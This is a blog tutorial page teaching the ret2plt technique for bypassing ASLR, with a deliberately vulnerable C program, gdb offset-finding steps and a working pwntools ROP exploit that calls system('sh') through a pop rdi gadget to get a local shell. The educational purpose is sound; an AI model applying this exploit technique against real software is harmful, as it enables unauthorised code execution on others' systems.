<!DOCTYPE html>
<html lang="en" dir="ltr">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Introduction # In the last couple of days, I had some time and wanted to get a better understanding and some experience in modern binary exploitation techniques. Part of this learning process is to explain what I&rsquo;ve learned to others. If you find an error, please let me know.
Also: While preparing for the OSCP I already tried a couple of protection bypasses like NX/DEP (Data Execution Prevention) with the ROPEmporium challenges.">
<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
<meta name="color-scheme" content="light dark"><meta property="og:url" content="http://localhost:1313/docs/HTB-Writeups/ret2plt-exploit/">
  <meta property="og:site_name" content="www.tagnull.de">
  <meta property="og:title" content="Exploit-Development - ret2plt">
  <meta property="og:description" content="Introduction # In the last couple of days, I had some time and wanted to get a better understanding and some experience in modern binary exploitation techniques. Part of this learning process is to explain what Iâ€™ve learned to others. If you find an error, please let me know.
Also: While preparing for the OSCP I already tried a couple of protection bypasses like NX/DEP (Data Execution Prevention) with the ROPEmporium challenges.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="docs">
    <meta property="article:published_time" content="2020-04-21T00:00:00+00:00">
    <meta property="article:modified_time" content="2020-04-21T00:00:00+00:00">
<title>Exploit-Development - ret2plt | www.tagnull.de</title>
<link rel="manifest" href="/manifest.json">
<link rel="icon" href="/logo.png" >
<link rel="canonical" href="http://localhost:1313/docs/HTB-Writeups/ret2plt-exploit/">
<link rel="stylesheet" href="/book.min.aaab74181c6b1b4045b90f1cce4aaa1631e06c4b04ec2890a00c5723953b070a.css" integrity="sha256-qqt0GBxrG0BFuQ8czkqqFjHgbEsE7CiQoAxXI5U7Bwo=" crossorigin="anonymous">
  <script defer src="/fuse.min.js"></script>
  <script defer src="/en.search.min.83bebab3890c5924fa66cd1ecb2c80beb86c0f933407ef59e20082e8b8f51813.js" integrity="sha256-g766s4kMWST6Zs0eyyyAvrhsD5M0B&#43;9Z4gCC6Lj1GBM=" crossorigin="anonymous"></script>

  

<!--
Made with Book Theme
https://github.com/alex-shpak/hugo-book
-->
  
</head>
<body dir="ltr">
  <input type="checkbox" class="hidden toggle" id="menu-control" />
  <input type="checkbox" class="hidden toggle" id="toc-control" />
  <main class="container flex">
    <aside class="book-menu">
      <div class="book-menu-content">
        
  <nav>
<h2 class="book-brand">
  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>www.tagnull.de</span>
  </a>
</h2>


<div class="book-search hidden">
  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
  <div class="book-search-spinner hidden"></div>
  <ul id="book-search-results"></ul>
</div>
<script>document.querySelector(".book-search").classList.remove("hidden")</script>












  



  
  <ul>
    
      
        <li class="book-section-flat" >
          
  
  

  
    <span>Cheatsheet</span>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <input type="checkbox" id="section-2860456b7de11418b89bc572c43149f3" class="toggle"  />
    <label for="section-2860456b7de11418b89bc572c43149f3" class="flex justify-between">
      <a role="button" class="">Enumeration</a>
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/Cheatsheet/enumeration/network/" class="">network</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/Cheatsheet/enumeration/web/" class="">web</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li>
          
  
  

  
    <input type="checkbox" id="section-300439dc6c81e7f8106c3eab98675b63" class="toggle"  />
    <label for="section-300439dc6c81e7f8106c3eab98675b63" class="flex justify-between">
      <a role="button" class="">Active Directory</a>
    </label>
  

          
  <ul>
    
  </ul>

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li class="book-section-flat" >
          
  
  

  
    <input type="checkbox" id="section-f1c85964cb4e1e3e13dfaf4558a33249" class="toggle" checked />
    <label for="section-f1c85964cb4e1e3e13dfaf4558a33249" class="flex justify-between">
      <a role="button" class="">HTB Writeups</a>
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/bountyhunter/" class="">BountyHunter</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/cap/" class="">Cap</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/the-notebook/" class="">The Notebook</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/traceback/" class="">Traceback</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/ret2plt-exploit/" class="active">Exploit-Development - ret2plt</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/safe/" class="">Safe</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/fortune/" class="">Fortune</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/onetwoseven/" class="">OneTwoSeven</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/querier/" class="">Querier</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/irked/" class="">Irked</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/gettinghashes/" class="">NTLM Hashes via GPO redirect</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/stratosphere/" class="">Stratosphere</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/access/" class="">Access</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/ypuffy/" class="">Ypuffy</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/HTB-Writeups/secnotes/" class="">SecNotes - WriteUp</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li class="book-section-flat" >
          
  
  

  
    <input type="checkbox" id="section-eba9495c08f1740750b4c94d7ec66515" class="toggle"  />
    <label for="section-eba9495c08f1740750b4c94d7ec66515" class="flex justify-between">
      <a role="button" class="">OSCP</a>
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/OSCP/oscp-reporting/" class="">Path to OSCP</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/OSCP/oscp-exploitdev/" class="">Path to OSCP - Exploit Development</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/OSCP/oscp-review/" class="">Path to OSCP - Review</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
  </ul>















</nav>




  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>


 
      </div>
    </aside>

    <div class="book-page">
      <header class="book-header">
        
  <div class="flex align-center justify-between">
  <label for="menu-control">
    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
  </label>

  <strong>Exploit-Development - ret2plt</strong>

  <label for="toc-control">
    
  </label>
</div>


  
 
      </header>

      
      
  <article class="markdown book-article"><p align="center">
  <img src="ret2plt_banner.png" />
</p>
<hr>
<h1 id="introduction">
  Introduction
  <a class="anchor" href="#introduction">#</a>
</h1>
<p>In the last couple of days, I had some time and wanted to get a better understanding and some experience in modern binary exploitation techniques.
Part of this learning process is to explain what I&rsquo;ve learned to others. If you find an error, please let me know.</p>
<p>Also: While preparing for the OSCP I already tried a couple of protection bypasses like NX/DEP (Data Execution Prevention) with the 
  <a href="https://ropemporium.com/">ROPEmporium</a> challenges.
I highly recommend them because they will teach some fundamentals we will use for bypassing another common protection, which is ASLR or Address Space Layout Randomization.</p>
<p>The first technique I am explaining is the ret2plt or &ldquo;Return to Procedural Linkage Table&rdquo;.</p>
<h2 id="whats-plt">
  What&rsquo;s PLT?
  <a class="anchor" href="#whats-plt">#</a>
</h2>
<p>In modern operating systems we have a lot of programming libraries. The most known one in linux is libc. It stores most of the common functions a program will
need to run properly. For example the <code>printf()</code> or <code>puts()</code> function. Once a progam is started the libc library is dynamicaly linked into that program.
Which means the program, could use all the functions in libc.</p>
<p>To find the function, let&rsquo;s say <code>printf()</code>, within libc the program needs to know the memory location of the function is at runtime.
But this is a shared library, other programs would also like to use <code>printf()</code>. But these programs run in their own process and have their own
virtual address space. So the addresses can&rsquo;t be the same.</p>
<p>One solution to this problem could be, to host multiple copies of <code>printf()</code> for each process. But, as you can imagine - that&rsquo;s quite inefficent.
Another solution is to introduce a small process specific memory area to store a little stub that points to the real <code>printf()</code>.
As this area isn&rsquo;t shared with other processes, it can simply be changed by the process to whatever it wants.</p>
<p>This stub, is the PLT. When opening a debugger later, we will see these stubs everywhere. They might look like this: <code>printf@plt</code>.
In a future blog post, I&rsquo;ll introduce another component to this. Which is the GOT or Global Offset Table.</p>
<p>If this explaination is to much for you right now, I suggest taking a look at this 
  <a href="http://infosec.vishalmishra.in/2013/03/procedure-linkage-table-and-global.html">blog post</a>.
The author has some nice pictures that might help you understand this a bit better.</p>
<p>The main take away should be: Functions are called with a level of indirection. A call to <code>printf()</code> will first call <code>printf@plt</code>.</p>
<h2 id="why-does-this-matter">
  Why does this matter?
  <a class="anchor" href="#why-does-this-matter">#</a>
</h2>
<p>This matters because we want to bypass a protection mechanism called ASLR, which randomizes the memory location of certain parts of a process.
Because of this randomization, we can&rsquo;t hardcode a memory addresses into our exploits anymore. They will change once a process restarts.
What we can do though, is use the stubs addresses instead, which then resolve to the real function address we want to call.</p>
<p>Before you get even more confused, let&rsquo;s go and play with an example.</p>
<h1 id="the-target">
  The Target
  <a class="anchor" href="#the-target">#</a>
</h1>
<p>This is our target progam we will attack today.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> desc[<span style="color:#ae81ff">100</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;clear&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Can you make me crash&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%s&#34;</span>,desc);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
<p>This code takes user provided data via the unsafe function <code>scanf()</code>. The buffer for the data is 100 bytes.
Let&rsquo;s compile this code and run it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># -fno-stack-protector = compile without &#34;stack canaries&#34; security mechanism</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -no-pie = compile without &#34;Position Independent Executabe (PIE)&#34; security mechanism</span>
</span></span><span style="display:flex;"><span>gcc ret2plt.c -o ret2plt -fno-stack-protector -no-pie
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>./ret2plt</span></span></code></pre></div>
<p>
  <img src="target-showcase-1.png" alt="target-showcase" /></p>
<p>Nice. An almost useless program.</p>
<h2 id="first-crash">
  First Crash
  <a class="anchor" href="#first-crash">#</a>
</h2>
<p>The next part is of cause to make it crash. We know from the source code that 100 bytes are the maxium
assigned buffer. So let&rsquo;s give it 300 bytes.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python3 <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;print(&#34;A&#34; * 300)&#39;</span></span></span></code></pre></div>
<p>
  <img src="target-first-crash.png" alt="target-crash" /></p>
<p>We confirmed it&rsquo;s crashing when a large input is given. The next part step is to examine when the crash happend
exactly. If you are not familiar with this process you should read my 
  <a href="https://www.tagnull.de/post/oscp-exploitdev/">OSCP buffer-overflow</a> article. This is just the setup
we always need to do, regardless of technique used.</p>
<h2 id="finding-the-offset">
  Finding the Offset
  <a class="anchor" href="#finding-the-offset">#</a>
</h2>
<p>To find the offset where the crash is happening I use gdb with the 
  <a href="https://gef.readthedocs.io/en/master/">gef extention</a>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gdb ./ret2plt</span></span></code></pre></div>
<p>Once gdb is up, I set a brakepoint in the main function.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>b main</span></span></code></pre></div>
<p>
  <img src="gdb-offset-1.png" alt="starting-gdb" /></p>
<p>Next we generate a non repeating pattern of 300 bytes.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pattern create <span style="color:#ae81ff">300</span></span></span></code></pre></div>
<p>We copy the output, then <code>r</code> to run the program. We will hit our breakpoint and the program will be paused.
Hit <code>c</code> to continue. You should get the password-promt now. Paste the pattern you&rsquo;ve copied and hit enter.</p>
<p>As expected, the program crashed again.</p>
<p>
  <img src="gdb-pattern-crash.png" alt="pattern-crash" /></p>
<p>Examine the different sections of the gdb output. You can see the stack full of our sent pattern.
You can also observe that we are stuck at a <code>ret</code> instruction and most importantly, that we have overwritten the <code>$rsp</code> register.</p>
<p>Copy the pattern (without &ldquo;[&hellip;]&rdquo;) and run the next command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pattern search &lt;pattern&gt;</span></span></code></pre></div>
<p>
  <img src="gdb-offset-found.png" alt="offset-found" /></p>
<p>Ok. We know, that the overflow happens after 120 bytes of input. We can start writing our exploit now.</p>
<h1 id="writing-the-exploit">
  Writing the exploit
  <a class="anchor" href="#writing-the-exploit">#</a>
</h1>
<p>I am using the pwntools library which is very nice and helpful. Again, google is your friend.
After importing pwntools we need to specify which progam we want to run. We also set the os we are running currently
and the architecture. This is just some pwntools stuff. But let&rsquo;s comment that out for now.
We will upgrade the exploit at the end and come back to this.</p>
<p>Next we define our junk value of 120 bytes. And lastly we write our payload to a file on disk.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># pwntools stuff for later</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#p = process(&#39;./ret2plt&#39;)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#context(os=&#39;linux&#39;, arch=&#39;adm64&#39;)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>junk <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">120</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;payload&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> w:
</span></span><span style="display:flex;"><span>    w<span style="color:#f92672">.</span>write(payload)</span></span></code></pre></div>
<p>But what now?</p>
<p>So, we probably want to get a shell through this vulnerability right? Which in turn means, we need to use a function that
executes a shell or <code>sh</code> for us. The first function that comes to mind is <code>system()</code>.</p>
<p>When you review the source code of our target we see, the <code>system()</code> function is already present. But the argument &ldquo;clear&rdquo;
won&rsquo;t help us with the shell. We need to call <code>system()</code> with our own argument. Like <code>sh</code>.
Conveniently I placed the string &ldquo;sh&rdquo; into the code in the word &ldquo;crash&rdquo;.</p>
<p>So our next steps are clear, find the location of &ldquo;sh&rdquo; and <code>system()</code> in our binary.</p>
<h2 id="finding-sh">
  Finding &ldquo;sh&rdquo;
  <a class="anchor" href="#finding-sh">#</a>
</h2>
<p>Finding &ldquo;sh&rdquo; is rather easy. Start the program with gdb as before. Set a breakpoint in <code>main</code> and hit run.
Once the breakpoint is reached just do:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grep sh</span></span></code></pre></div>
<p>You will get a long list of different &ldquo;sh&rdquo; places. But pay attention where they have been found.
Most of them are found in libc. Which is not the target for todays mission. Scroll up and you will find
something like this:</p>
<p>
  <img src="sh-in-binary.png" alt="sh-in-binary" /></p>
<p>So we have the location of the string &ldquo;sh&rdquo;. Luckily we have two locations. The first one has <code>0x20</code> in it which is a bad
character. We have to use the one with the <code>0x30</code> in it instead. Let&rsquo;s update our exploit with the new information.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># pwntools stuff for later</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#p = process(&#39;./ret2plt&#39;)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#context(os=&#39;linux&#39;, arch=&#39;adm64&#39;)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>junk <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">120</span>
</span></span><span style="display:flex;"><span>sh <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x40301d</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;payload&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> w:
</span></span><span style="display:flex;"><span>    w<span style="color:#f92672">.</span>write(payload)</span></span></code></pre></div>
<p>Next on our list is <code>system()</code>. This is also easy to find. We quit out of gdb and run:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>objdump -d ret2plt | grep system</span></span></code></pre></div>
<p>The result should look like this:</p>
<p>
  <img src="system-plt.png" alt="system@plt" /></p>
<p>We are interessted in the first line. This is the address of <code>system@plt</code>. This address is not randomized.
And this is also our stub to the real <code>system()</code>. Let&rsquo;s put that also into our exploit.</p>
<p>Are we good? No yet. One last piece is missing. We are running all this on a 64 Bit system. Which means
that arguments to a function, like &ldquo;sh&rdquo; for <code>system()</code>, needs to be passed via the <code>$rdi</code> register.</p>
<p>How do we get it in there? Glad you asked. As DEP is also enabled and we can&rsquo;t execute data from the stack anyways
we have to use a ROP technique aswell. We need a <code>pop rdi; ret</code> instruction that&rsquo;s already present within our binary.</p>
<p>We can search for one with the tool ROPGadget like so:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ROPgadget --binary ret2plt | grep rdi</span></span></code></pre></div>
<p>
  <img src="pop-rdi.png" alt="pop-rdi" /></p>
<p>Hint: it&rsquo;s the second line. ;)</p>
<p>Let&rsquo;s update our exploit again and while we are at it, let&rsquo;s build our payload at the same time.
The finished exploit looks like this now:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># pwntools stuff for later</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#p = process(&#39;./ret2plt&#39;)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#context(os=&#39;linux&#39;, arch=&#39;adm64&#39;)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>junk <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">120</span>
</span></span><span style="display:flex;"><span>sh <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x40301d</span>)
</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x401030</span>)
</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x4011eb</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> junk <span style="color:#f92672">+</span> pop_rdi <span style="color:#f92672">+</span> sh <span style="color:#f92672">+</span> system
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;payload&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> w:
</span></span><span style="display:flex;"><span>    w<span style="color:#f92672">.</span>write(payload)</span></span></code></pre></div>
<h2 id="will-it-work-though">
  Will it work though?
  <a class="anchor" href="#will-it-work-though">#</a>
</h2>
<p>Let&rsquo;s run the exploit and check if an file called &ldquo;payload&rdquo; has been created. If so, let&rsquo;s run the following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>cat payload;cat<span style="color:#f92672">)</span> | ./ret2plt</span></span></code></pre></div>
<p>You should get a blank terminal. Hit enter, and then type <code>id</code> or <code>ls</code> or whatever shell command you want. ;)
I typed <code>ls</code> twice as you can see:</p>
<p>
  <img src="cat-shell.png" alt="cat-shell" /></p>
<p>Nice. We&rsquo;ve got a shell. =)</p>
<h1 id="wtf-happend">
  Wtf happend?
  <a class="anchor" href="#wtf-happend">#</a>
</h1>
<p>Let&rsquo;s open the target program in gdb once more, set a breakpoint at <code>main()</code> and <code>r &lt; payload</code> to
feed it our payload.</p>
<p>Once we hit our breakpoint, single-step trough the program with <code>s</code>. Everytime you enter a function, you can rush through
it with <code>finish</code>. However, pay attention to the &ldquo;code&rdquo; section, once you step out of <code>scanf()</code>, we want to observe what&rsquo;s
happening.</p>
<p>
  <img src="scanf-finish.png" alt="scanf-finish" /></p>
<p>Let&rsquo;s go slower now.</p>
<p>Once we are back in <code>main()</code> we can see our payload on the stack.</p>
<p>
  <img src="full-stack.png" alt="full-stack" /></p>
<p>Also we see that we are about to <code>leave</code> the <code>main()</code> function.</p>
<p>
  <img src="leave-main.png" alt="leave-main" /></p>
<p>Single-step twice. Once we hit the <code>ret</code> we can see what&rsquo;s happening next.
First of all, the next instruction is <code>pop rdi</code>, followed by a <code>ret</code>. Sounds familiar?</p>
<p>
  <img src="pop_rdi-2.png" alt="pop_rdi-2" /></p>
<p>Now check the stack. After the <code>pop rdi</code> comes <code>sh</code>.</p>
<p>
  <img src="pop-sh.png" alt="pop-sh" /></p>
<p>Single-Step through this slowly and see how the process unfolds.</p>
<ol>
<li><code>pop rdi</code> will be put into <code>$rip</code></li>
<li>Address of &ldquo;sh&rdquo; will be put into <code>$rdi</code></li>
<li><code>ret</code> will be executed</li>
<li><code>system</code> will be called next</li>
</ol>
<p>
  <img src="system-call.png" alt="system-call" /></p>
<p>Exactly how we planed it.</p>
<h1 id="updates">
  Updates
  <a class="anchor" href="#updates">#</a>
</h1>
<p>Let&rsquo;s make our exploit and the shell a bit more shiny.
First we uncomment the pwntools line we already have at the top.</p>
<p>Next we remove the write function and introduce the last two lines of this finish exploit code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># pwntools stuff for now</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./ret2plt&#39;</span>)
</span></span><span style="display:flex;"><span>context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;adm64&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>junk <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">120</span>
</span></span><span style="display:flex;"><span>sh <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x40301d</span>)
</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x401030</span>)
</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x4011eb</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> junk <span style="color:#f92672">+</span> pop_rdi <span style="color:#f92672">+</span> sh <span style="color:#f92672">+</span> system
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive(<span style="color:#e6db74">&#34;&gt; &#34;</span>)</span></span></code></pre></div>
<p>That&rsquo;s all for now. Run the exploit and you should get a shell that&rsquo;s a bit nicer.</p>
<p>
  <img src="final_shell.png" alt="final_shell" /></p>
<h1 id="last-words">
  Last words
  <a class="anchor" href="#last-words">#</a>
</h1>
<p>That&rsquo;s it for today. I hope this was somewhat understandable and helps you writing own exploits.
Of cause you can download all the code from my 
  <a href="https://github.com/tagnullde/Exploit-Development/tree/master/ASLR-Bypass/ret2plt">github</a>.</p>
<p>In the next days I would like to write another article that take this a bit further.
What happens if we don&rsquo;t have <code>system()</code> nor &ldquo;sh&rdquo; at our disposal? What can we do then?
If you want to know the answer, come back in a couple of days. ;)</p>
<p>x41</p>
</article>
 
      

      <footer class="book-footer">
        
  <div class="flex flex-wrap justify-between">





</div>



  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>


 
        
      </footer>

      
  
 

      <label for="menu-control" class="hidden book-menu-overlay"></label>
    </div>

    
  </main>

  
</body>
</html>












